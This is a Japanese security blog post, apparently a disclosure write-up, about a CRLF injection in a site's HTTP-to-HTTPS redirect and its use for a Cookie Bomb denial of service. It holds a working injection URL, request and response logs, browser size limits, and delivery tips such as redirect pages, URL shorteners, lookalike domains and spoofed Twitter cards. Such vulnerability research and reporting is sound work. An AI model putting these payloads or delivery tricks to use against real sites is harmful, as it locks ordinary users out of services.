# CRLFインジェクションによるCookie Bombの脅威

[前々回のエントリー](/2018/crlfi_via_path_of_request-uri.md)の執筆中に、私が普段から利用しているサイトでCRLFインジェクションの脆弱性を発見した。その問題を関係者へ報告する際に、現実的な脅威としてCookie Bombを挙げた。その経緯をまとめておく。

## CRLFインジェクションの脆弱性

対象サイトはHTTPSでサービスを提供しており、HTTPで接続するとHTTPSへのリダイレクトが発生する。その際のパスに含めた `CR` （%0D）がLocationヘッダに出力されたため、Firefoxを除く主要ブラウザで任意のヘッダを挿入できた。以下は実際のPoCからドメインを変更したものである。

hxxp://example.com/%0DSet-Cookie:name=value;domain=.example.com

```
GET /%0DSet-Cookie:name=value;domain=.example.com HTTP/1.1
Host: example.com
...
```
```
HTTP/1.1 301 Moved Permanently
Date: Wed, 24 Jan 2018 00:38:21 GMT
Server: Apache
Location: https://example.com/
Set-Cookie:name=value;domain=.example.com
...
```

このような脆弱性の脅威として、バグハンターのSergey Bobrov氏は[レポートの中で以下の3つを挙げている](https://hackerone.com/reports/15492)。

- CookieによるXSS
- CookieによるCSRF対策の回避
- セッションフィクセーション

レポートにも記載されているが、これらの脅威はサイトの実装や他の脆弱性と組み合わせる必要がある。対象サイトでは直ちに脅威とはならなかったため、実際にどのような被害が発生するか具体例を示して報告したいと考えた。

## Cookie Bombへの応用

Cookie Bombは、非常に長いCookieを搭載したリクエストをサーバーが拒否する動作を利用したDoS攻撃であり、Sakurityのリサーチャーである[Egor Homakov氏によって名付けられた](http://homakov.blogspot.jp/2014/01/cookie-bomb-or-lets-break-internet.html)といわれている。

RFCではリクエストヘッダのサイズの上限が定義されていないため、サーバーごとに受け取れるサイズの上限が異なる。Apacheのデフォルト設定では[8190byteが上限](http://httpd.apache.org/docs/2.4/mod/core.html#limitrequestfieldsize)となっており、Cookieヘッダのサイズが8190byteを超えていると400エラーがレスポンスされる。

### 必要条件

今回はパスからのCRLFインジェクションによってSet-Cookieヘッダをレスポンスに挿入し、非常に長いCookieをブラウザに付与する。Serverヘッダの値から対象サーバーはApacheと想定し、Cookieヘッダのサイズが8190byteを超えるような値を付与する。  

ここで注意すべきはブラウザが保存できるCookie一つあたりのサイズと、ブラウザが送信できるRequest-URIのサイズと、サーバーが受け取れるリクエストラインのサイズの3つの上限である。デフォルト設定のApacheが受け取れるリクエストライン（メソッド、URI、プロトコルバージョン）のサイズは[8190byteが上限](http://httpd.apache.org/docs/2.4/mod/core.html#limitrequestline)となっている。主要ブラウザごとの各上限は以下である。

|                       | Chrome64       | Safari11       | Edge41         | IE11           | Firefox58      |
| :-------------------: | :------------: | :------------: | :------------: | :------------: | :------------: |
| **Cookie**            | 4096byte<sup>1 | 4097byte<sup>2 | 5118byte<sup>1 | 5118byte<sup>1 | 4097byte<sup>2 |
| **Request-URI**<sup>3 | N/A<sup>4      | N/A<sup>4      | N/A<sup>4      | 5120byte       | N/A<sup>4      |

<sup>1</sup> 属性を含むSet-Cookieヘッダの値の上限である。  
<sup>2</sup> 属性を含まないSet-Cookieヘッダの値（名前、`=`、値）の上限である。  
<sup>3</sup> URLリンクを踏ませる想定で\<a\>タグのhref属性から発生するリクエストを計測した。  
<sup>4</sup> 10000byteのRequest-URIを送信できることを確認した。それ以上は計測していない。  

今回はURLリンクから発生するリクエストでのDoS攻撃を目的としたため、一度に5120byteを超える情報をRequest-URIから送信できないIE11は対象外とした。`CR` をヘッダフィールドの終端として扱わないFirefoxも対象外である。Chrome、Safari、Edgeを対象に実証した。

どのブラウザも一つのCookieに8190byteを超える情報を保存できないため、二つのCookieに分割して付与する必要がある。リクエストでは複数のCookieを一つのヘッダで送信するため分割しても支障はない。Cookieヘッダのサイズが8190byteを超えるようにCookieを付与し、かつリクエストラインのサイズを8190byte以下に収めたURLを作成しなければならない。CRLFインジェクションで付与する以外のCookieが存在しないとこの条件は満たせない。

対象サイトではHTTPSにリダイレクトした際にセッションIDや用途不明のCookieが複数付与される。これらのサイズの合計が310byteであるため、上限からこの分を差し引いた7880byteを超えるCookieを追加すればよい。これならリクエストラインの上限以下でURLを作成できる。

今回の実証で示すURLの必要条件は以下の通りである。

1. Cookie（名前、`=`、値）一つあたりのサイズが4096byte以下になる。
2. 付与する二つのCookie（名前、`=`、値）のサイズの合計が7880byteを超える。
3. URLリンクから発生するリクエストラインのサイズが8190byte以下になる。

### 概念実証

以下は必要条件を全て満たしたURLとそのリンクから発生した通信のログである。Cookie（boma、bomb）の各サイズは4005byteであるため条件1.を満たし、合計のサイズは8010byteとなるため条件2.も満たす。リクエストラインのサイズは8188byteとなり条件3.も満たす。

hxxp://example.com/%0DSet-Cookie:boma=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... a;domain=.example.com;expires=Wed,%2001%20Jan%202025%2000:00:00%20GMT%0DSet-Cookie:bomb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ... b;domain=.example.com;expires=Wed,%2001%20Jan%202025%2000:00:00%20GMT

```
GET /%0DSet-Cookie:boma=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... a;domain=.example.com;expires=Wed,%2001%20Jan%202025%2000:00:00%20GMT%0DSet-Cookie:bomb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ... b;domain=.example.com;expires=Wed,%2001%20Jan%202025%2000:00:00%20GMT HTTP/1.1
Host: example.com
...
```
```
HTTP/1.1 301 Moved Permanently
Date: Thu, 25 Jan 2018 01:18:30 GMT
Server: Apache
Location: https://example.com/
Set-Cookie:boma=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... a;domain=.example.com;expires=Wed, 01 Jan 2025 00:00:00 GMT
Set-Cookie:bomb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ... b;domain=.example.com;expires=Wed, 01 Jan 2025 00:00:00 GMT
...
```

これで非常に長い二つのCookieがブラウザに付与される。domain属性に `.example.com` を設定しているのは、サブドメインにも影響範囲を広げるためである。またexpires属性に `Wed, 01 Jan 2025 00:00:00` のような未来を設定することで影響を長期化できる。

これ以降は対象サイトにアクセスするたびにセッションIDや用途不明のCookieに加え、非常に長い二つのCookieも送信されるようになる。以下は対象サイトのトップページに再度アクセスした際のログである。リクエストのCookieヘッダのサイズは8332byteであり、Apacheのリクエストヘッダの上限である8190byteを超えるため400エラーがレスポンスされている。

hxxps://example.com/

```
GET / HTTP/1.1
Host: example.com
...
Cookie: a_aa=aaaa; b_bb=bbbbbbbbbbbbb; c_ccccc=cccccccccccccccccccccccccccccccccccccccccccccccccc; d_dd=ddddddddddddd; _example_session_id=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx; ee_e=eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee; ff_f=ffffffffffffffffffffffffffffffff; gg_g=gggggggggggggggggggggggggggggggg; hh_h=h; iiii_ii_iiii_iiiii=i; boma=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa ... a; bomb=bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ... b
...
```
```
HTTP/1.1 400 Bad Request
Date: Thu, 25 Jan 2018 01:18:31 GMT
Server: Apache
Content-Length: 305
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
Size of a request header field exceeds server limit.<br />
<pre>
Cookie
</pre>
</p>
</body></html>
```

## 現実的な攻撃方法

概念実証で示したURLリンクほど長くては非技術者であっても不審に感じて踏むのをためらうだろう。攻撃者の所有するサイトからリダイレクトさせることで長いURLを隠蔽できる<sup id="f1">[1](#fn1)</sup>。

https://atsunoda.github.io/gist/impact_of_cookie_bomb/example.html

このURLはドメインが対象サイトのものでないためアクセス率の低下が懸念される。[偽装ドメインを利用する](https://www.farsightsecurity.com/2018/01/17/mschiffm-touched_by_an_idn/)という手もあるが、対象サイトの運営会社や不特定多数のユーザーへの不利益を望むのであれば、このURLをSNSで拡散するだけでも効果があるだろう。Twitterでは[Twitterカード](https://dev.twitter.com/web/sign-inhttps://dev.twitter.com/ja/cards/overview)の仕組みを悪用し、対象サイトのタイトルや概要、画像を設置することでツイート上のリンクを偽装できる。

<p align="center"><img src="https://user-images.githubusercontent.com/5434303/37240313-070f9022-248d-11e8-9d55-987843e285a9.png" alt="Fake Tweet" /></p>

このツイートを閲覧したユーザーがリンクを踏むとブラウザまたはアプリに非常に長いCookieが付与され、対象サイトにアクセスできなくなる恐れがある。今回のケースではiPhoneのTwitterアプリとChrome、Safari、EdgeでCookie Bombの影響を受け、対象サイトにアクセスできなくなった<sup id="f2">[2](#fn2)</sup>。Androidでは検証していないが同様の可能性はあった。

## 所感

近頃のダークネス玉葱君が行なったサイバー攻撃の反響を見ていると、実感のない情報漏えいの被害よりも、実害が発生するDoS攻撃の方が一般ユーザーの関心は高いように感じる。一般的なDDoS攻撃とCookie BombによるDoS攻撃は全く異なる手法だが、サービスを利用できなくなった被害者にとって手法の違いは関係ない。Cookie Bombを悪用し、SNSで流れてきたリンクを踏んだだけでDoS攻撃が成立していたら、多数のユーザーに被害が及んだかもしれない。運営会社には問い合わせや批判が殺到し、株価にまで影響が及ぶ可能性もあった。

今回はCRLFインジェクションによってCookieを付与したが、JavaScriptを実行できれば任意のCookieを付与できる。そのためサブドメイン上でJavaScriptの実行を許可しているGitHub PagesやHerokuのようなサービスは、Cookie Bombの影響を受けやすいと考えていた。しかしドメインが[Public Suffix List](https://publicsuffix.org/)に登録されていたため、主要ブラウザではCookieのdomain属性に `.github.io` や `.herokuapp.com` といった広範囲を設定できなかった<sup id="f3">[3](#fn3)</sup>。もし同様のサービスでドメインがリストに登録されていなければ、サービスの脆弱性として報告する価値はある。

CRLFインジェクションやXSSがなくてもパラメータの入力値がCookieに含まれるような動作があり、入力値の文字数が制限されていなければ、Cookie Bombの影響を受ける恐れがある<sup id="f4">[4](#fn4)</sup>。このようなケースは脆弱性として認定される可能性が高いため、バグバウンティのスコープ内で検出した場合は報告していきたい。

今回発見した脆弱性はサイト運営会社のCSIRTへ報告し、翌日には修正された。

---

<sup id="fn1">[1](#f1)</sup> 短縮URL化も考え、[Google](https://goo.gl/)、[Bitly](https://bit.ly/)、[TinyURL](https://tinyurl.com/)、[Twitter](https://t.co/)で検証したところ、TinyURLだけで短縮できた。  
<sup id="fn2">[2](#f2)</sup> Chrome、SafariはMacとiPhoneから、EdgeはWin10とiPhoneから検証した。  
<sup id="fn3">[3](#f3)</sup> [Win8.1以前のIEはPublic Suffix Listを参照しない](https://blogs.msdn.microsoft.com/ie/2014/10/06/interoperable-top-level-domain-name-parsing-comes-to-ie/)ため広範囲のdomain属性を設定できる。そのため [`atsunoda.github.io`](https://atsunoda.github.io/gist/impact_of_cookie_bomb/github.html) にアクセスすると、Cookieが消えるまで `*.github.io` にアクセスできなくなる。検証前にIEでTLS 1.2を有効にしておく必要がある。  
<sup id="fn4">[4](#f4)</sup> Twitterにあったこの動作を[@filedescriptor](https://twitter.com/filedescriptor)氏はCookie Bombに応用し、そこから[レスポンス分割に発展させた](https://blog.innerht.ml/tag/cookie-bomb/)。  